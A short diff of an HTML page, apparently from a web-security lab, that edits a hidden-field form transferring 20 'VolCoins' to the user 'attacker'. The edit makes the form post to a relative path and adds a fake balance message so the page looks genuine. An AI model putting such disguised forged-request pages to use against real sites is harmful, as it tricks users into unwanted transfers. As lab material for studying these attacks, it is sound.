@@ -8,9 +8,10 @@
 </head>
 <body>
     <h3>Transfer VolCoins</h3>
-    <form class="pure-form pure-form-stacked" action="http://localhost:3000/post_transfer" method="post">
+    <form class="pure-form pure-form-stacked" action="/post_transfer" method="post">
         <input type="hidden" name="destination_username" value="attacker">
         <input type="hidden" name="quantity" value="20">
+        <p>You currently have 1100 volCoins.</p>
         <button id="transferButton">Transfer</button>
     </form>
     <script>
